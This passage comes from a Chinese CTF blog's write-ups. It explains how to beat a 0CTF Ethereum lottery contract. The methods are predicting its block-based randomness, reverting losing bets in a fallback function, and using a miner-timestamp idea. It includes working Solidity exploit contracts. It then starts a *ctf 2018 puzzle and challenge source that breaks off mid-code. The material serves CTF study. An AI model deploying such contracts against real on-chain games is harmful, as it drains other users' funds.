&#123;</span><br><span class="line">        uint component1;</span><br><span class="line">        uint component2;</span><br><span class="line">        uint component3;</span><br><span class="line">        uint component4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint private base = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    address private owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ZeroLottery</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        balanceOf[msg.sender] = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">seed</span>(<span class="params">SeedComponents components</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        uint secretSeed = uint256(keccak256(</span><br><span class="line">            components.component1,</span><br><span class="line">            components.component2,</span><br><span class="line">            components.component3,</span><br><span class="line">            components.component4</span><br><span class="line">        ));</span><br><span class="line">        <span class="keyword">return</span> secretSeed;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bet</span>(<span class="params">uint guess</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value&gt;<span class="number">1</span> ether);</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">        uint secretSeed = seed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));</span><br><span class="line">        uint n = uint(keccak256(uint(msg.sender), secretSeed)) % base;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (guess != n) &#123;</span><br><span class="line">            balanceOf[msg.sender] = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// charge 0.5 ether for failure</span></span><br><span class="line">            msg.sender.transfer(msg.value - <span class="number">0.5</span> ether);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// charge 1 ether for success</span></span><br><span class="line">        msg.sender.transfer(msg.value - <span class="number">1</span> ether);</span><br><span class="line">        balanceOf[msg.sender] = balanceOf[msg.sender] + <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">paolu</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嗯，还给了个文件，方便大家本地配置环境的。</p><p>genesis.json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;config&quot;: &#123;</span><br><span class="line">        &quot;chainId&quot;: 1337,</span><br><span class="line">        &quot;homesteadBlock&quot;: 0,</span><br><span class="line">        &quot;eip155Block&quot;: 0,</span><br><span class="line">        &quot;eip158Block&quot;: 0</span><br><span class="line">    &#125;,</span><br><span class="line">  &quot;alloc&quot;      : &#123;</span><br><span class="line">    &quot;0x0000000000000000000000000000000000000001&quot;: &#123;&quot;balance&quot;: &quot;0&quot;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;coinbase&quot;   : &quot;0x0000000000000000000000000000000000000000&quot;,</span><br><span class="line">  &quot;difficulty&quot; : &quot;0x0&quot;,</span><br><span class="line">  &quot;extraData&quot;  : &quot;&quot;,</span><br><span class="line">  &quot;gasLimit&quot;   : &quot;0x2fefd8&quot;,</span><br><span class="line">  &quot;nonce&quot;      : &quot;0x00000000deadbeef&quot;,</span><br><span class="line">  &quot;mixhash&quot;    : &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">  &quot;parentHash&quot; : &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">  &quot;timestamp&quot;  : &quot;0x00&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先，我们要先了解以太坊智能合约和solidity。</p><p>好的，我们已经花了10分钟充分理解了智能合约和solidity（/吐槽 你又充分理解了。。。）</p><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p><strong>智能合约是是一种旨在以信息化方式传播、验证或执行合同的计算机协议。智能合约允许在没有第三方的情况下进行可信交易。这些交易可追踪且不可逆转。</strong></p><p>通俗的说，智能合约是一段公开的代码，当它部署到区块链上后，它会有对应的一个地址，通过对这个地址发起交易可以调用里面的函数。</p><ul><li>私有信息和随机性</li></ul><p>私有信息在智能合约中是不存在的，因为所有东西都是公开可见的。</p><p>随机性是很难达到的，因为信息都是公开的，即便是以区块的时间戳等信息作为随机源也不能阻止恶意节点利用这个作弊。</p><ul><li>重入</li></ul><p>任何从合约 A 到合约 B 的交互以及任何从合约 A 到合约 B 的 以太币（Ether） 的转移，都会将控制权交给合约 B。 这使得合约 B 能够在交互结束前回调 A 中的代码。 </p><p>参考The DAO</p><ul><li>智能合约可以调用其他智能合约</li></ul><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>看该智能合约代码可以知道随机源包括</p><ul><li>挖到区块的矿工地址</li><li>区块难度</li><li>区块gas limit</li><li>挖到区块时的时间戳</li></ul><p><img src="/img/0ctf/1.png" alt=""></p><p>So，我们可以创建一个智能合约，用这些信息算出答案，然后，用这个答案去调用题目给的智能合约，即可。</p><p>注意要保证该智能合约地址有ether，从上图可以看到，要先调用<code>init</code>函数使<code>balance</code>大于0，然后调用<code>bet</code>函数时即可转大于<code>1 ether</code>即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line">contract EXP&#123;</span><br><span class="line">    struct SeedComponents &#123;</span><br><span class="line">        uint component1;</span><br><span class="line">        uint component2;</span><br><span class="line">        uint component3;</span><br><span class="line">        uint component4;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    uint private base = <span class="number">8</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span> ()public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callInit</span>(<span class="params">address addr</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(addr.call(bytes4(keccak256(<span class="string">"init()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">seed</span>(<span class="params">SeedComponents components</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        uint secretSeed = uint256(keccak256(</span><br><span class="line">            components.component1,</span><br><span class="line">            components.component2,</span><br><span class="line">            components.component3,</span><br><span class="line">            components.component4</span><br><span class="line">        ));</span><br><span class="line">        <span class="keyword">return</span> secretSeed;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callBet</span>(<span class="params">address addr</span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint secretSeed = seed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));</span><br><span class="line">        uint n = uint(keccak256(uint(address(<span class="keyword">this</span>)), secretSeed)) % base;</span><br><span class="line">        <span class="built_in">require</span>(addr.call.value(<span class="number">1.1</span> ether)(bytes4(keccak256(<span class="string">"bet(uint256)"</span>)), n));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（这里我曾失了智的忘写ether单位，后来求助@md5_salt大佬）</p><p>感觉操作挺简单的，</p><p>部署我们的EXP合约，</p><p>给他转<code>9 ether</code>，</p><p>调用<code>callInit</code></p><p>调用<code>callBet</code>，赢一次，继续调用，知道balance超过500。</p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>有个已知的小知识点，向智能合约转<code>ether</code>的时候，会调用它的fallback函数。</p><p>然后，题目里面的合约是赢了就扣<code>1 ether</code>，然后将剩下的<code>ether</code>返回给发送者，输了则扣<code>0.5 ether</code>，然后将剩下的<code>ether</code> 返回给发送者，所以，我们可以在fallback函数中通过判断返回的<code>ether</code>的数量来判断是否赢了，如果输了就耍赖，抛出异常什么的，让整个交易回滚。（耍赖大法好）</p><p>solution如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line">contract EXP2&#123;</span><br><span class="line"></span><br><span class="line">    uint sendBackValue;</span><br><span class="line">    <span class="keyword">constructor</span> ()public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callInit</span>(<span class="params">address addr</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(addr.call(bytes4(keccak256(<span class="string">"init()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callBet</span>(<span class="params">address addr</span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        assert(addr.call.gas(<span class="number">60000</span>).value(<span class="number">2</span> ether)(bytes4(keccak256(<span class="string">"bet(uint256)"</span>)), <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，每次转<code>2 ether</code>去赌博，返回不是·<code>1 ether</code>，即输了，就耍赖。</p><p>所以，操作是，</p><p>部署合约，部署合约的时候顺带转<code>9 ether</code> ，</p><p>然后，调用<code>callInit</code>函数</p><p>然后，疯狂调用<code>callBet</code>函数，你就可以赢钱就说OK，输钱就耍赖。</p><h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>解法三是我比赛的时候首先想到的，然后还找到了n多证据证明自己是对的，就一直在死磕，没有去找别的办法。</p><p>最终在编译挖矿客户端的c++的时候一直编译不成功，心态崩了。心累。</p><p>上面有提到，随机源</p><ul><li>挖到区块的矿工地址</li><li>区块难度</li><li>区块gas limit</li><li>挖到区块时的时间戳</li></ul><p>其中前三个都可以通过暴露的json-RPC接口来预测到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ethjsonrpc <span class="keyword">import</span> EthJsonRpc</span><br><span class="line">c = EthJsonRpc(<span class="string">'127.0.0.1'</span>, <span class="number">8200</span>)</span><br><span class="line">coinbase =  int(c.eth_coinbase(),<span class="number">16</span>)</span><br><span class="line">difficulty = int(<span class="number">2</span>**<span class="number">256</span> / int(c.eth_getWork()[<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">block_num = c.eth_blockNumber()</span><br><span class="line">last_block = c.eth_getBlockByNumber(block_num)</span><br><span class="line">gaslimit = int(last_block[<span class="string">'gasLimit'</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>然后，后面只剩下下一次挖到矿的时间戳了。</p><p>上面也有提到，时间戳是可以被恶意矿工利用的。</p><p>所以，我们如果能够作为一个恶意的矿工，我们就能够疯狂挖矿，挖到区块后，先用来算答案，提交交易，然后再同步挖到的区块。</p><p>嗯，思路非常清晰。</p><p>然后，我们需要找到一个通过Json-RPC接口挖矿的办法。</p><p>然后，找到了。</p><p><img src="/img/0ctf/2.png" alt=""></p><p><img src="/img/0ctf/3.png" alt=""></p><p>6，然后，用<a href="https://github.com/ethereum-mining/ethminer" target="_blank" rel="noopener">ethminer</a>连接上去，发现挖矿速度激增。</p><p>这，万事具备，什么都不缺。额，还缺修改、编译ethminer的代码，然后，就跪在这里了。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://solidity-cn.readthedocs.io/zh/develop/security-considerations.html" target="_blank" rel="noopener">http://solidity-cn.readthedocs.io/zh/develop/security-considerations.html</a></p><p><a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_getwork" target="_blank" rel="noopener">https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_getwork</a></p><p><a href="https://github.com/ethereum-mining/ethminer" target="_blank" rel="noopener">https://github.com/ethereum-mining/ethminer</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> 智能合约 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>starctf-ctf-2018</title>
      <link href="//blog/2018/starctf-ctf-2018.html"/>
      <url>//blog/2018/starctf-ctf-2018.html</url>
      
        <content type="html"><![CDATA[<h3 id="Web-1-simpleweb"><a href="#Web-1-simpleweb" class="headerlink" title="Web 1: simpleweb"></a>Web 1: simpleweb</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"></span><br><span class="line">flag=<span class="string">'fake_flag'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = net.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">socket.on(<span class="string">'data'</span>, (data) =&gt; &#123; </span><br><span class="line"><span class="comment">//m = data.toString().replace(/[\n\r]*$/, '');</span></span><br><span class="line">ok = <span class="literal">true</span>;</span><br><span class="line">arr = data.toString().split(<span class="string">' '</span>);</span><br><span class="line">arr = arr.map(<span class="built_in">Number</span>);</span><br><span class="line"><span class="keyword">if</span> (arr.length != <span class="number">5</span>) </span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line">arr1 = arr.slice(<span class="number">0</span>);</span><br><span class="line">arr1.sort();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">if</span> (arr1[i+<span class="number">1</span>] == arr1[i] || arr[i] &lt; <span class="number">0</span> || arr1[i+<span class="number">1</span>] &gt; <span class="number">127</span>)</span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line">arr2 = []</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">arr2.push(arr1[i] + arr1[i+<span class="number">1</span>]);</span><br><span class="line">val = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">val = val * <span class="number">0x100</span> + arr2[i];</span><br><span class="line"><span class="keyword">if</span> (val != <span class="number">0x23332333</span>)</span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (ok)</span><br><span class="line">socket.write(flag+<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">socket.write(<span class="string">'nope\n'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//socket.write('Echo server\r\n');</span></span><br><span class="line"><span class="comment">//socket.pipe(socket);</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'0.0.0.0'</span></span><br><span class="line">PORT = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line">server.listen(PORT, HOST);</span><br></pre></td></tr></table></figure><p>非常简短的一段js代码，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">分析下流程</span><br><span class="line">(((a * 256 + b ) * 256 + c) *256 + d) = 0x23332333</span><br><span class="line"></span><br><span class="line">a0+a1=35</span><br><span class="line">a1+a2=51</span><br><span class="line">a2+a3=35</span><br><span class="line">a3+a4=51</span><br><span class="line">凑，因为sort的原因</span><br><span class="line">a0=15</span><br><span class="line">a1=20</span><br><span class="line">a2=31</span><br><span class="line">a3=4</span><br><span class="line">a4=47</span><br></pre></td></tr></table></figure><p>主要可能引起误解的是这里的<code>sort</code>函数是按照字典序排序的</p><p>如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; [<span class="number">8</span>,<span class="number">12</span>,<span class="number">90</span>].sort()</span><br><span class="line">[<span class="number">12</span>,<span class="number">8</span>,<span class="number">90</span>]</span><br></pre></td></tr></table></figure><h3 id="Web-2-Smart-Contract"><a href="#Web-2-Smart-Contract" class="headerlink" title="Web 2: Smart? Contract"></a>Web 2: Smart? Contract</h3><blockquote><p>​                                </p><p>Yet another blockchain challenge with tokens in the smart contract. Be careful that the blockchain is stored in the cookie and a browser might ignore set-cookie header if it is too long, which prevents the blockchain being updated. So send the requests using scripts.</p><p><a href="http://47.75.9.127:10012/6af948d659f0b7c5d3950a/" target="_blank" rel="noopener">http://47.75.9.127:10012/6af948d659f0b7c5d3950a/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid, os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span></span><br><span class="line">url_prefix = <span class="string">'/6af948d659f0b7c5d3950a'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: *ctf&#123;******************&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></span><br><span class="line">    <span 